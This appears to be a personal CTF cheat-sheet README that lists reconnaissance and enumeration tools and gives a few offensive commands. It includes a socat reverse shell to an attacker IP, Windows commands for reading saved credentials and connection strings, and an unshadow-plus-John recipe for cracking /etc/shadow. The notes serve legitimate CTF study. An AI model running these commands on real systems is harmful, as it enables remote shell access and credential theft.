This repo contains some miscallenious notes/tips for me to use when I do CTFs. Mostly contains list of tools

## Ivestigation

### SSL/TLS Certificates

[Certificate search](https://crt.sh)  
Find certificates by certificate hash, domain name or organization name

NsLookup  
Tool to lookup DNS records

[DNSDumpster](https://dnsdumpster.com)  
Tool for subdomain enumeration.

[Shodan](https://shodan.io)  
Search Engine for Internet connected devices

### Identifying technologies

[OWASP favicon database](https://wiki.owasp.org/index.php/OWASP_favicon_database) - Use favicon md5-sums to find the framework

Wappalyzer - Browser plugin that (I assume) reads HTTP-headers and identifies underlying technologies

[Sublist3r](https://github.com/aboul3la/Sublist3r)  
Subdomain enumerator that uses OSINT

## Enumeration/Scanning

nmap  
Search for open ports in a machine. Automatically look for exploits for the software running in the ports 

Rustscan    
Same as nmap but faster

### Content discovery

[Fuzz Faster u Fool](https://github.com/ffuf/ffuf)  
Find direcotries/VHosts in a website. Can also be used to fuzz GET parameter 

[Gobuster](https://github.com/OJ/gobuster)  
Find directories/DNSs/VHosts in a website

[DNSRecon](https://github.com/darkoperator/dnsrecon)  
DNS Enumeration Script

## Exploiting

More stable shell

### Socat  
On the attacker machine, run the command ```socat TCP-L:<PORT> FILE:`tty`,raw,echo=0```  
On the victim machine run the command ```socat TCP:<attacker-ip>:<attacker-port> exec:"bash -li",pty,stderr,sigint,setsid,sane```

# Priv Esc

[linPEAS/winPEAS](https://github.com/carlospolop/PEASS-ng)  
Scripts that look for vulnerabilities inside the OS.

[GTFObins](https://gtfobins.github.io/)  
Curated list of Unix binaries that can be used to bypass local security restrictions in a miconfigured system.

## Windows typical spots for saved credentials

### Powershell history (from cmd)
```type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt```

### Saved Windows Credentials 
List the saved windows credentials 
```cmdkey /list```

Run a program with the saved credentials 
```runas /savecred /user:<user> cmd.exe```

### IIS Configs 
```type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionStrin```

### Putty's Proxy sessions 
```req query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s```

## Post exploit

### Unshadow tool  
Use ```unshadow passwd.txt shadow.txt > passwords.txt``` where passwd.txt contains the contents from ```/etc/passwd``` and shadow.txt ```/etc/shadow```  

### [John](https://github.com/openwall/john)
After you've used the unshadow tool, you can use ```john passwords.txt``` to bruteforce the passwords


## Misc

[CyberChef](https://gchq.github.io/CyberChef)

[WebHook Site](https://webhook.site/)
